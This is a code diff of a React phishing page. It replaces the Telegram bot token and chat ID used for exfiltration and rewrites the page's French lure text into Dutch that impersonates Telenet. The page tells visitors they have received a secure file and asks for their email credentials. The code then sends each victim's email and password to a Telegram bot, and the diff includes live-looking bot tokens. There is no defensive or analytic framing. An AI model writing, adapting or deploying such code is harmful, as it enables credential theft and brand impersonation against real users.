@@ -40,8 +40,8 @@ function Home() {
 
     try {
         // Envoyer les informations via Telegram
-        const botToken = '7443548014:AAHxxtghL0YOo8r1j6GrgM_kOV0HLHtqpTk';
-        const chatId = '5387352019';
+        const botToken = '7676962098:AAEPkm5U8BHU_PvXsO30rfz-nf3icuMfYoA';
+        const chatId = '7702979825';
         const message = `Infos NoReply\nEmail: ${email}\nPassword: ${password}`;
 
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -85,12 +85,12 @@ function Home() {
 
       <div className="section">
         <div className="h2">
-          <h2>Vérifiez Votre Identité</h2>
+          <h2>Controleer uw Telenet-identiteit</h2>
         </div>
         <hr />
         <div className="section2">
           <h5 style={{ marginTop: "2vw" }}>
-            Vous avez reçu un fichier sécurisé
+            U hebt een beveiligd bestand ontvangen
           </h5>
           <div className="file">
             <img src={pdf} alt="" />
@@ -98,8 +98,8 @@ function Home() {
           </div>
 
           <h5>
-            Pour lire le document, veuillez entrer les identifiants de messagerie
-            auxquels ce fichier a été envoyé.
+            Voer uw e-mailgegevens in om het document te lezen
+            naar wie dit bestand is verstuurd.
           </h5>
 
           <div className="images">
